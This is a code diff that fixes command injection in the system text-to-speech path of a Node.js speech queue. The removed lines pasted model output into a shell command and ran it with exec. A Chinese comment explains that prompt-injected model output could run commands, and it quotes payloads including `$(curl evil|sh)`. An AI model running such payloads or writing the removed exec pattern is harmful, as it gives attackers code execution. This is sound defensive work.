@@ -1,4 +1,4 @@
-import { exec, spawn } from 'child_process';
+import { spawn } from 'child_process';
 import { promises as fs } from 'fs';
 import os from 'os';
 import path from 'path';
@@ -98,20 +98,52 @@ async function processQueue() {
     }
 
     if (model === 'system') {
-        // system TTS
-        const cmd = isWin
-            ? `powershell -NoProfile -Command "Add-Type -AssemblyName System.Speech; \
-            $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate=2; \
-            $s.Speak('${txt.replace(/'/g,"''")}'); $s.Dispose()"`
+        // ★ F-EXEC-201（2026-11-06）：**绝不再把文本拼进命令行**。
+        // 原来这里是 `exec(cmd)`，cmd 由 txt 拼成（win 只转义单引号、mac/linux 只转义双引号），
+        // 于是模型输出（可被提示注入）里的 `hi"; & echo PWNED & rem "` 或 `$(curl evil|sh)`
+        // 会变成真正的命令。**转义黑名单永远漏**，所以改结构：argv 全是字面量，文本走 stdin。
+        //
+        // ⚠️ 两条复核席实测结论，别"顺手加固"错了方向（2026-11-06）：
+        //   ① **不要**在这里加 `[Console]::InputEncoding = [Text.Encoding]::UTF8`。
+        //      实测 Windows 下默认编码**本来就是对的**；加了那行**反而把中文念成乱码**。
+        //      （改之前先在真机试一遍中文，别凭直觉。）
+        //   ② `inspectChatText` **不是 shell 过滤器** —— 它只拦"以 / 开头的行"，
+        //      对 `"` `$()` `&` `|` 完全不拦。将来任何"文本 → 外部进程"的实现都**不得依赖它**，
+        //      必须像这里一样：参数走 argv 字面量、数据走 stdin。
+        const file = isWin ? 'powershell' : isMac ? 'say' : 'espeak';
+        const argv = isWin
+            ? ['-NoProfile', '-NonInteractive', '-Command',
+                'Add-Type -AssemblyName System.Speech; ' +
+                '$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; ' +
+                '$s.Rate = 2; ' +
+                '$t = [Console]::In.ReadToEnd(); ' +   // 文本只从 stdin 进，绝不进命令行
+                '$s.Speak($t); $s.Dispose()']
             : isMac
-            ? `say "${txt.replace(/"/g,'\\"')}"`
-            : `espeak "${txt.replace(/"/g,'\\"')}"`;
+            ? []                                     // `say` 无参数 = 从 stdin 读
+            : ['--stdin'];                           // espeak 显式从 stdin 读
 
-        exec(cmd, err => {
-            if (err) console.error('TTS error', err);
+        let finished = false;
+        const done = () => {
+            if (finished) return;                    // error 与 close 可能都触发，只推进一次
+            finished = true;
             isSpeaking = false;
             continueQueue();
-        });
+        };
+
+        let child;
+        try {
+            child = spawn(file, argv, { stdio: ['pipe', 'ignore', 'ignore'], windowsHide: true });
+        } catch (e) {
+            console.error('TTS spawn failed', e);
+            done();
+            return;
+        }
+        child.on('error', (err) => { console.error('TTS error', err); done(); });
+        child.on('close', () => done());
+        if (child.stdin) {
+            child.stdin.on('error', () => { /* EPIPE：子进程已退出，close 会推进队列 */ });
+            child.stdin.end(String(txt));
+        }
 
     } 
     else {
